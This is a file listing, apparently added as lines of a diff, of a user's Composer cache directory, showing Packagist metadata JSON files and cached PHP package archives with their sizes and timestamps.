+-rw-rw-r-- 1 bolt bolt 1600 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/packages.json
+-rw-rw-r-- 1 bolt bolt 27193 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$thumbs.json
+-rw-rw-r-- 1 bolt bolt 9034 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-ircmaxell$password-compat.json
+-rw-rw-r-- 1 bolt bolt 2888405 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-2019-04.json
+-rw-rw-r-- 1 bolt bolt 7269 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$codingstyle.json
+-rw-rw-r-- 1 bolt bolt 296260 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$polyfill-mbstring.json
+-rw-rw-r-- 1 bolt bolt 5450 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-dflydev$markdown.json
+-rw-rw-r-- 1 bolt bolt 11620 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$requirements-checker.json
+-rw-rw-r-- 1 bolt bolt 102798 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpunit$phpunit-mock-objects.json
+-rw-rw-r-- 1 bolt bolt 63919 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-cocur$slugify.json
+-rw-rw-r-- 1 bolt bolt 28001 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-silex$web-profiler.json
+-rw-rw-r-- 1 bolt bolt 2008055 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$browser-kit.json
+-rw-rw-r-- 1 bolt bolt 54435 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-filp$whoops.json
+-rw-rw-r-- 1 bolt bolt 604507 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-2013.json
+-rw-rw-r-- 1 bolt bolt 6351 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$finder-facade.json
+-rw-rw-r-- 1 bolt bolt 6573 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sorien$silex-pimple-dumper.json
+-rw-rw-r-- 1 bolt bolt 1943164 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$process.json
+-rw-rw-r-- 1 bolt bolt 3831 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$object-reflector.json
+-rw-rw-r-- 1 bolt bolt 61261 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$polyfill-php55.json
+-rw-rw-r-- 1 bolt bolt 60313 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-psr$cache.json
+-rw-rw-r-- 1 bolt bolt 7424 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-ircmaxell$random-lib.json
+-rw-rw-r-- 1 bolt bolt 53509 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-codeception$phpunit-wrapper.json
+-rw-rw-r-- 1 bolt bolt 9212 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$package-wrapper.json
+-rw-rw-r-- 1 bolt bolt 11119 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpunit$php-timer.json
+-rw-rw-r-- 1 bolt bolt 2787138 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$polyfill-php70.json
+-rw-rw-r-- 1 bolt bolt 21714 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-stecman$symfony-console-completion.json
+-rw-rw-r-- 1 bolt bolt 12823 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-guzzlehttp$promises.json
+-rw-rw-r-- 1 bolt bolt 8975 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$lexer.json
+-rw-rw-r-- 1 bolt bolt 33558 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-imagine$imagine.json
+-rw-rw-r-- 1 bolt bolt 1941057 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$finder.json
+-rw-rw-r-- 1 bolt bolt 3879 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-league$flysystem-memory.json
+-rw-rw-r-- 1 bolt bolt 15415 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$persistence.json
+-rw-rw-r-- 1 bolt bolt 1424394 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$asset.json
+-rw-rw-r-- 1 bolt bolt 1625988 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$polyfill-ctype.json
+-rw-rw-r-- 1 bolt bolt 4098 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$event-manager.json
+-rw-rw-r-- 1 bolt bolt 13909 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-webmozart$glob.json
+-rw-rw-r-- 1 bolt bolt 2071332 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$translation.json
+-rw-rw-r-- 1 bolt bolt 13753 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-seld$jsonlint.json
+-rw-rw-r-- 1 bolt bolt 2060402 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$event-dispatcher.json
+-rw-rw-r-- 1 bolt bolt 16098 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-erusev$parsedown-extra.json
+-rw-rw-r-- 1 bolt bolt 8127 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$collection.json
+-rw-rw-r-- 1 bolt bolt 141587 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-archived.json
+-rw-rw-r-- 1 bolt bolt 26396 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpdocumentor$type-resolver.json
+-rw-rw-r-- 1 bolt bolt 3663 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$resource-operations.json
+-rw-rw-r-- 1 bolt bolt 15131 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$collections.json
+-rw-rw-r-- 1 bolt bolt 25039 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpunit$dbunit.json
+-rw-rw-r-- 1 bolt bolt 413441 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$bolt.json
+-rw-rw-r-- 1 bolt bolt 10615 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-webmozart$path-util.json
+-rw-rw-r-- 1 bolt bolt 9431 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$recursion-context.json
+-rw-rw-r-- 1 bolt bolt 54271 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$polyfill-util.json
+-rw-rw-r-- 1 bolt bolt 10041 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-roave$security-advisories.json
+-rw-rw-r-- 1 bolt bolt 49663 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpdocumentor$reflection-docblock.json
+-rw-rw-r-- 1 bolt bolt 1886010 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$filesystem.json
+-rw-rw-r-- 1 bolt bolt 11291 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-siriusphp$upload.json
+-rw-rw-r-- 1 bolt bolt 2002269 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$http-foundation.json
+-rw-rw-r-- 1 bolt bolt 2052220 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$console.json
+-rw-rw-r-- 1 bolt bolt 64595 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-swiftmailer$swiftmailer.json
+-rw-rw-r-- 1 bolt bolt 27589 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-ua-parser$uap-php.json
+-rw-rw-r-- 1 bolt bolt 4399 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-seld$cli-prompt.json
+-rw-rw-r-- 1 bolt bolt 214758 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-nesbot$carbon.json
+-rw-rw-r-- 1 bolt bolt 160885 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpunit$php-code-coverage.json
+-rw-rw-r-- 1 bolt bolt 13299 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-theseer$fdomdocument.json
+-rw-rw-r-- 1 bolt bolt 26205 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-myclabs$deep-copy.json
+-rw-rw-r-- 1 bolt bolt 6850 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-brandonwamboldt$utilphp.json
+-rw-rw-r-- 1 bolt bolt 2346870 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$yaml.json
+-rw-rw-r-- 1 bolt bolt 2793 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-ircmaxell$security-lib.json
+-rw-rw-r-- 1 bolt bolt 162856 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-guzzlehttp$guzzle.json
+-rw-rw-r-- 1 bolt bolt 17507 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-pimple$pimple.json
+-rw-rw-r-- 1 bolt bolt 17565 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-miljar$php-exif.json
+-rw-rw-r-- 1 bolt bolt 145489 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$dbal.json
+-rw-rw-r-- 1 bolt bolt 61193 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$polyfill-php54.json
+-rw-rw-r-- 1 bolt bolt 8967 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-codeception$stub.json
+-rw-rw-r-- 1 bolt bolt 62332 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-erusev$parsedown.json
+-rw-rw-r-- 1 bolt bolt 1463467 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-2018-10.json
+-rw-rw-r-- 1 bolt bolt 2967 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$code-unit-reverse-lookup.json
+-rw-rw-r-- 1 bolt bolt 17623 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$common.json
+-rw-rw-r-- 1 bolt bolt 23435 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-composer$ca-bundle.json
+-rw-rw-r-- 1 bolt bolt 54534 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-justinrainbow$json-schema.json
+-rw-rw-r-- 1 bolt bolt 1889700 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$property-access.json
+-rw-rw-r-- 1 bolt bolt 150642 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-twig$twig.json
+-rw-rw-r-- 1 bolt bolt 74246 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$common.json
+-rw-rw-r-- 1 bolt bolt 20659 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-ralouphie$getallheaders.json
+-rw-rw-r-- 1 bolt bolt 77703 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-silex$silex.json
+-rw-rw-r-- 1 bolt bolt 1997858 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$config.json
+-rw-rw-r-- 1 bolt bolt 68899 Sep 27 10:21 /home/bolt/.cache/composer/files/ua-parser/uap-php/a77818a0fcd8cb98cf043820f7ced4612e70ffe7.zip
+-rw-rw-r-- 1 bolt bolt 6802393 Sep 27 09:18 /home/bolt/.cache/composer/files/imagine/imagine/efb19acc764529a25cfff59bc7c42fc58dc34d0f.zip
+-rw-rw-r-- 1 bolt bolt 647015 Sep 27 10:20 /home/bolt/.cache/composer/files/twig/twig/a35c1c7dcae5058ed06b226418b13f49d6f92662.zip
+-rw-rw-r-- 1 bolt bolt 101600 Sep 27 10:22 /home/bolt/.cache/composer/files/guzzlehttp/guzzle/458dc54f95563ea143ddfee9abd4d50de2021259.zip
+-rw-rw-r-- 1 bolt bolt 56553 Sep 27 09:18 /home/bolt/.cache/composer/files/guzzlehttp/psr7/05cf10975dc0b6d6323f3ed451a823498f7196aa.zip
+-rw-rw-r-- 1 bolt bolt 22760 Sep 27 10:22 /home/bolt/.cache/composer/files/guzzlehttp/promises/ba05e5df3bded4f01482d4b16ae313a79742eba6.zip
+-rw-rw-r-- 1 bolt bolt 11389 Sep 27 10:21 /home/bolt/.cache/composer/files/erusev/parsedown-extra/bcf904c5878e7e689fc761769e58ff9d9d25d732.zip
+-rw-rw-r-- 1 bolt bolt 11520 Sep 27 10:21 /home/bolt/.cache/composer/files/erusev/parsedown/535a5cde6a993ab1b19231bb515f4fa02d077a91.zip
+-rw-rw-r-- 1 bolt bolt 6065 Sep 27 09:18 /home/bolt/.cache/composer/files/paragonie/random_compat/4296d043eccd1d50ae22ea650174df624e2a438e.zip
+-rw-rw-r-- 1 bolt bolt 31543 Sep 27 10:22 /home/bolt/.cache/composer/files/codeception/phpunit-wrapper/fce25f73fb8bd94665d6af4b6ac859101ad3847c.zip
+-rw-rw-r-- 1 bolt bolt 1171400 Sep 27 10:22 /home/bolt/.cache/composer/files/codeception/codeception/c1d7dff150334d753948a4b382e0e0d0a4f15d0c.zip
+-rw-rw-r-- 1 bolt bolt 19974 Sep 27 10:22 /home/bolt/.cache/composer/files/codeception/stub/5bed6e3fabfd7dc613ef02308eab6ac9cde987bc.zip
+-rw-rw-r-- 1 bolt bolt 46701 Sep 27 10:22 /home/bolt/.cache/composer/files/theseer/fdomdocument/288e09275be791a9d4d078813b6fee6c4480e006.zip
+-rw-rw-r-- 1 bolt bolt 185973 Sep 27 09:19 /home/bolt/.cache/composer/files/silex/silex/d7ec8a3a089ed56b0356e9681189d33d6f87b265.zip
+-rw-rw-r-- 1 bolt bolt 5081 Sep 27 10:21 /home/bolt/.cache/composer/files/silex/web-profiler/48c630c541748b347537ba7fb5a1f598c4fe19d0.zip
+-rw-rw-r-- 1 bolt bolt 46340 Sep 27 10:21 /home/bolt/.cache/composer/files/siriusphp/upload/b77e18a3f16cb6f89c71cce268580c4e6691aa8e.zip
+-rw-rw-r-- 1 bolt bolt 46090 Sep 27 10:21 /home/bolt/.cache/composer/files/siriusphp/validation/bc8c946f6530d2b3c7e875f1c01d3da5625bd234.zip
+-rw-rw-r-- 1 bolt bolt 13722 Sep 27 10:21 /home/bolt/.cache/composer/files/composer/spdx-licenses/3c9fbe69a33afd68d2bc2f8512c4e1dd613ecc27.zip
+-rw-rw-r-- 1 bolt bolt 610687 Sep 27 10:21 /home/bolt/.cache/composer/files/composer/composer/e200a7e9dbccb7dc94dae089a219097487ea3822.zip
+-rw-rw-r-- 1 bolt bolt 136003 Sep 27 09:18 /home/bolt/.cache/composer/files/composer/ca-bundle/d69214737384b4f1d5d697c3d1ea3f631b5aba34.zip
+-rw-rw-r-- 1 bolt bolt 16890 Sep 27 10:21 /home/bolt/.cache/composer/files/composer/xdebug-handler/7bc7483262a93e82222a25cd1d12d70b365957fc.zip
+-rw-rw-r-- 1 bolt bolt 15585 Sep 27 10:21 /home/bolt/.cache/composer/files/composer/semver/73ed352fa366967240e74d9d27e7b4bc25660eb0.zip
+-rw-rw-r-- 1 bolt bolt 474595 Sep 27 10:21 /home/bolt/.cache/composer/files/swiftmailer/swiftmailer/b82ffb190aeb4193e1f352535015e0c2bae5b28c.zip
+-rw-rw-r-- 1 bolt bolt 12454 Sep 27 09:19 /home/bolt/.cache/composer/files/pimple/pimple/c5505a21bc18358443ddf008357c073a33a4cd49.zip
+-rw-rw-r-- 1 bolt bolt 38261 Sep 27 10:20 /home/bolt/.cache/composer/files/bolt/collection/0db72717aa225df48a0992b64108f64519dee78e.zip
+-rw-rw-r-- 1 bolt bolt 2165985 Sep 27 10:20 /home/bolt/.cache/composer/files/bolt/themes/c7549a84a27635438b8d8629afe9c0a5ac04d58f.zip
+-rw-rw-r-- 1 bolt bolt 144421 Sep 27 09:18 /home/bolt/.cache/composer/files/bolt/filesystem/43e353a3b08314a349ce470d6be63c13fe008497.zip
+-rw-rw-r-- 1 bolt bolt 52544 Sep 27 10:20 /home/bolt/.cache/composer/files/bolt/session/296a01fcc69060f4a8d02d045f203d703941f6e8.zip
+-rw-rw-r-- 1 bolt bolt 603861 Sep 27 09:18 /home/bolt/.cache/composer/files/bolt/passwordlib/7af510daa1f5734fd37f063a4786b30cf8a14109.zip
+-rw-rw-r-- 1 bolt bolt 70715 Sep 27 10:20 /home/bolt/.cache/composer/files/bolt/pathogen/30e42f247dbc2694bc6547227827c4073e78f97d.zip
+-rw-rw-r-- 1 bolt bolt 29151 Sep 27 09:18 /home/bolt/.cache/composer/files/bolt/common/1923b395fc9b1a12858ca78f035bfa648d4aa9fe.zip
+-rw-rw-r-- 1 bolt bolt 523569 Sep 27 09:19 /home/bolt/.cache/composer/files/bolt/thumbs/2dcb56613213a9c2f6d363e715092cd1c926e075.zip
+-rw-rw-r-- 1 bolt bolt 19827 Sep 27 09:18 /home/bolt/.cache/composer/files/bolt/requirements/1f8433af1b743f86d66cfbc73327d76254d75787.zip
+-rw-rw-r-- 1 bolt bolt 799 Sep 27 09:19 /home/bolt/.cache/composer/files/bolt/package-wrapper/6e85d2a5b72f8776ed01b809b2994a69e8eb7091.zip
+-rw-rw-r-- 1 bolt bolt 9274 Sep 27 10:22 /home/bolt/.cache/composer/files/sebastian/finder-facade/d71c012fe5bcf4f032cf0ee14f54cfd21de0fe7e.zip
+-rw-rw-r-- 1 bolt bolt 9464 Sep 27 10:22 /home/bolt/.cache/composer/files/sebastian/object-enumerator/d91a189f317ea2b63ee8e5e2431bc67cc35b0468.zip
+-rw-rw-r-- 1 bolt bolt 7975 Sep 27 10:21 /home/bolt/.cache/composer/files/sebastian/recursion-context/82276e6cc560a972510bb0c2dc0aa78fa4701777.zip
+-rw-rw-r-- 1 bolt bolt 9103 Sep 27 10:21 /home/bolt/.cache/composer/files/sebastian/environment/72b70c30c0946406c4562db7b7c647d084a87e12.zip
+-rw-rw-r-- 1 bolt bolt 7540 Sep 27 10:21 /home/bolt/.cache/composer/files/sebastian/code-unit-reverse-lookup/9fdb38e356a0265a2dd6b64495413906b9366038.zip
+-rw-rw-r-- 1 bolt bolt 40094 Sep 27 10:21 /home/bolt/.cache/composer/files/sebastian/comparator/bdc0b01e0827c360d54386fe60dfc6bd65168f80.zip
+-rw-rw-r-- 1 bolt bolt 8477 Sep 27 10:22 /home/bolt/.cache/composer/files/sebastian/resource-operations/fd2c0f591ee5fee7aa3eb70f20a1d64c1dc26e8d.zip
+-rw-rw-r-- 1 bolt bolt 23758 Sep 27 10:21 /home/bolt/.cache/composer/files/sebastian/diff/2c388a9205c45eea8983ed2e35f83b7bfd108ad0.zip
+-rw-rw-r-- 1 bolt bolt 10118 Sep 27 10:21 /home/bolt/.cache/composer/files/sebastian/exporter/81e14d73852681aabe5c5a9d8be1ef2045a9170a.zip
+-rw-rw-r-- 1 bolt bolt 17052 Sep 27 10:22 /home/bolt/.cache/composer/files/sebastian/global-state/a0ef5bf736af85b66572f9ed232aa35c18fe5fb7.zip
+-rw-rw-r-- 1 bolt bolt 29825 Sep 27 10:22 /home/bolt/.cache/composer/files/sebastian/phpcpd/51275f523c8fef90e4e7f435ece50bad79eaa972.zip
+-rw-rw-r-- 1 bolt bolt 5045 Sep 27 10:21 /home/bolt/.cache/composer/files/sebastian/version/c315a200d32565a6d8ebb3495cb5ae34c5ced3c8.zip
+-rw-rw-r-- 1 bolt bolt 8659 Sep 27 09:19 /home/bolt/.cache/composer/files/doctrine/event-manager/afc495a452489ecd8ed3fe027cea42845a369865.zip
+-rw-rw-r-- 1 bolt bolt 38529 Sep 27 09:18 /home/bolt/.cache/composer/files/doctrine/cache/278d523019d2b2e00715a6a9c40f11845b5abd4f.zip
+-rw-rw-r-- 1 bolt bolt 361735 Sep 27 10:21 /home/bolt/.cache/composer/files/doctrine/dbal/3fadfec33cc44e5bf246c01686a58afef98dee0b.zip
+-rw-rw-r-- 1 bolt bolt 26005 Sep 27 09:19 /home/bolt/.cache/composer/files/doctrine/collections/c160653604fa7f2fb5cd6b857d354c3d8212614c.zip
+-rw-rw-r-- 1 bolt bolt 4801 Sep 27 09:19 /home/bolt/.cache/composer/files/doctrine/lexer/32b3727d79f519462d9d3ff7cf899a3764f5aa7f.zip
+-rw-rw-r-- 1 bolt bolt 54158 Sep 27 09:19 /home/bolt/.cache/composer/files/doctrine/annotations/7fa203b943c035abbbf35dd31dd3df51b058fb16.zip
+-rw-rw-r-- 1 bolt bolt 37781 Sep 27 09:19 /home/bolt/.cache/composer/files/doctrine/persistence/906001903502e61dd3015bcb02fffefd48dbc6cb.zip
+-rw-rw-r-- 1 bolt bolt 13993 Sep 27 09:19 /home/bolt/.cache/composer/files/doctrine/reflection/276d722ea54059b10cec2143dbe2ae894d582fcc.zip
+-rw-rw-r-- 1 bolt bolt 11539 Sep 27 10:22 /home/bolt/.cache/composer/files/doctrine/instantiator/8921036f299159bb1b05641163cd04de696706e4.zip
+-rw-rw-r-- 1 bolt bolt 69528 Sep 27 10:21 /home/bolt/.cache/composer/files/filp/whoops/09e0e06ca28db2b5b8efcf1185eb8317d7da5393.zip
+-rw-rw-r-- 1 bolt bolt 55355 Sep 27 10:22 /home/bolt/.cache/composer/files/phpdocumentor/reflection-docblock/acc15809a9b421ff34159cb5a3ee4d81f7456503.zip
+-rw-rw-r-- 1 bolt bolt 39147 Sep 27 10:22 /home/bolt/.cache/composer/files/phpdocumentor/type-resolver/15b3ff51bc5c098484c651fe08e049a02f8905b6.zip
+-rw-rw-r-- 1 bolt bolt 10611 Sep 27 10:22 /home/bolt/.cache/composer/files/phpdocumentor/reflection-common/989820d4d3bc32a26c6e3cc70dd511d1b2102399.zip
+-rw-rw-r-- 1 bolt bolt 4881 Sep 27 10:22 /home/bolt/.cache/composer/files/league/flysystem-memory/16d90736f1a4f0a70b07398400680ae0c5b05af1.zip
+-rw-rw-r-- 1 bolt bolt 45830 Sep 27 09:18 /home/bolt/.cache/composer/files/league/flysystem/8771c8f1dd6849e9260eeac160b1b15071717eea.zip
+-rw-rw-r-- 1 bolt bolt 55676 Sep 27 10:22 /home/bolt/.cache/composer/files/myclabs/deep-copy/a60f7dbe0bde64f9dcca2b3799424ae87192faae.zip
+-rw-rw-r-- 1 bolt bolt 26327 Sep 27 09:18 /home/bolt/.cache/composer/files/webmozart/glob/02a672d5448ca0f561453adedc478551ce623e93.zip
+-rw-rw-r-- 1 bolt bolt 13204 Sep 27 09:18 /home/bolt/.cache/composer/files/webmozart/assert/7fc0f4e7b26967d39cc208fc88dcd53265a27353.zip
+-rw-rw-r-- 1 bolt bolt 23791 Sep 27 09:18 /home/bolt/.cache/composer/files/webmozart/path-util/ff1d33cde88eccc6bb88ffa68f46e56f82b5d85a.zip
+-rw-rw-r-- 1 bolt bolt 2558080 Sep 27 09:18 /home/bolt/.cache/composer/files/miljar/php-exif/d93c8fa05d659d1d84fe8bb6951ddaac0de73bb1.zip
+-rw-rw-r-- 1 bolt bolt 4954 Sep 27 09:18 /home/bolt/.cache/composer/files/ralouphie/getallheaders/45d96088f80deb8ae644680d941f2aa1c3b4bfc7.zip
+-rw-rw-r-- 1 bolt bolt 7203 Sep 27 09:19 /home/bolt/.cache/composer/files/tdammers/htmlmaid/b2188467cd1cbd2bff35d87e51cfadf80be13842.zip
+-rw-rw-r-- 1 bolt bolt 4547 Sep 27 10:22 /home/bolt/.cache/composer/files/psr/simple-cache/977de1cd1e7a1a991cbdf4204e86faeaeeb42382.zip
+-rw-rw-r-- 1 bolt bolt 6033 Sep 27 10:22 /home/bolt/.cache/composer/files/psr/cache/db0acef2d2023a676945c844eded3b911c3089c2.zip
+-rw-rw-r-- 1 bolt bolt 10602 Sep 27 09:18 /home/bolt/.cache/composer/files/psr/log/2f9814bcf6dac4c979837c715da5b59ad7e313ab.zip
+-rw-rw-r-- 1 bolt bolt 16850 Sep 27 09:18 /home/bolt/.cache/composer/files/psr/http-message/cc1d4e9ee13f2053b80c08976256789bf3be5256.zip
+-rw-rw-r-- 1 bolt bolt 42748 Sep 27 10:21 /home/bolt/.cache/composer/files/jdorn/sql-formatter/c58d407cfd5a9f38b19854087d4ff221aad35113.zip
+-rw-rw-r-- 1 bolt bolt 35796 Sep 27 10:21 /home/bolt/.cache/composer/files/stecman/symfony-console-completion/73e8cb7957ecb864c7c5370bd98503c8cfab2567.zip
+-rw-rw-r-- 1 bolt bolt 96513 Sep 27 10:22 /home/bolt/.cache/composer/files/phpspec/prophecy/0ea281efc6fadd80d0a2d27a7bac830ab159b33a.zip
+-rw-rw-r-- 1 bolt bolt 88237 Sep 27 09:18 /home/bolt/.cache/composer/files/nesbot/carbon/3ba1e0b1b389727ebf8767165797f183b99190ad.zip
+-rw-rw-r-- 1 bolt bolt 10823 Sep 27 10:22 /home/bolt/.cache/composer/files/lstrojny/phpunit-function-mocker/3359ca6ad6b4b4319fdd7cb58fcea076fa2ff79a.zip
+-rw-rw-r-- 1 bolt bolt 25217 Sep 27 10:21 /home/bolt/.cache/composer/files/ircmaxell/security-lib/e42bd4b45a5ec4585565e455fe1c1a67c2167a98.zip
+-rw-rw-r-- 1 bolt bolt 51685 Sep 27 10:21 /home/bolt/.cache/composer/files/ircmaxell/random-lib/1b3002deca5ad83e154692023e568987508bb615.zip
+-rw-rw-r-- 1 bolt bolt 5257 Sep 27 09:18 /home/bolt/.cache/composer/files/ircmaxell/password-compat/8ae40885703fa9cc9177c59b4e351c09ae7e3327.zip
+-rw-rw-r-- 1 bolt bolt 146258 Sep 27 10:21 /home/bolt/.cache/composer/files/monolog/monolog/c078865992ad71f07993638628e509c508c716c2.zip
+-rw-rw-r-- 1 bolt bolt 17779 Sep 27 09:18 /home/bolt/.cache/composer/files/seld/jsonlint/29b8fcc7fd77d0323bdaf101fada981f663df7ac.zip
+-rw-rw-r-- 1 bolt bolt 4554 Sep 27 10:21 /home/bolt/.cache/composer/files/seld/phar-utils/0930b263364ee9a78cd628fb1e223e413e613674.zip
+-rw-rw-r-- 1 bolt bolt 93737 Sep 27 10:20 /home/bolt/.cache/composer/files/cocur/slugify/67fd141588705a4172873121c9eeb677f58a5518.zip
+-rw-rw-r-- 1 bolt bolt 140060 Sep 27 10:22 /home/bolt/.cache/composer/files/behat/gherkin/6dd84c295f6226172958e758610e145606e2ec11.zip
+-rw-rw-r-- 1 bolt bolt 126797 Sep 27 10:21 /home/bolt/.cache/composer/files/embed/embed/d7dd51fb1edefea196a3b4e5a5f062fbefecda3d.zip
+-rw-rw-r-- 1 bolt bolt 157154 Sep 27 10:22 /home/bolt/.cache/composer/files/facebook/webdriver/7afedf759d024c5aa189ed6b1054b4fb998e0662.zip
+-rw-rw-r-- 1 bolt bolt 5858 Sep 27 10:22 /home/bolt/.cache/composer/files/sorien/silex-pimple-dumper/03a170486b03dc9881a178ef707b095c8c57b73e.zip
+-rw-rw-r-- 1 bolt bolt 120869 Sep 27 10:22 /home/bolt/.cache/composer/files/phpunit/phpunit-mock-objects/f973865512456d20f5245449638202768a8bc365.zip
+-rw-rw-r-- 1 bolt bolt 3957 Sep 27 10:21 /home/bolt/.cache/composer/files/phpunit/php-text-template/2e483bd8277c3ff3905be9160b0938b306ac1069.zip
+-rw-rw-r-- 1 bolt bolt 28570 Sep 27 10:21 /home/bolt/.cache/composer/files/phpunit/php-token-stream/847779f97e481ab7202d42799695898cb3dd0230.zip
+-rw-rw-r-- 1 bolt bolt 422598 Sep 27 10:22 /home/bolt/.cache/composer/files/phpunit/php-code-coverage/ac9ecc80c01dc47e653a4e4e5c257ba3a9979946.zip
+-rw-rw-r-- 1 bolt bolt 164744 Sep 27 10:22 /home/bolt/.cache/composer/files/phpunit/dbunit/6b5a5288de90996b84accd79833fab7050524559.zip
+-rw-rw-r-- 1 bolt bolt 7143 Sep 27 10:22 /home/bolt/.cache/composer/files/phpunit/php-file-iterator/c72081fb1b0355ba61fcbc82b0407120d560a4b0.zip
+-rw-rw-r-- 1 bolt bolt 6071 Sep 27 10:22 /home/bolt/.cache/composer/files/phpunit/php-timer/61188251883d8889298c2c47f0508e05c8b05791.zip
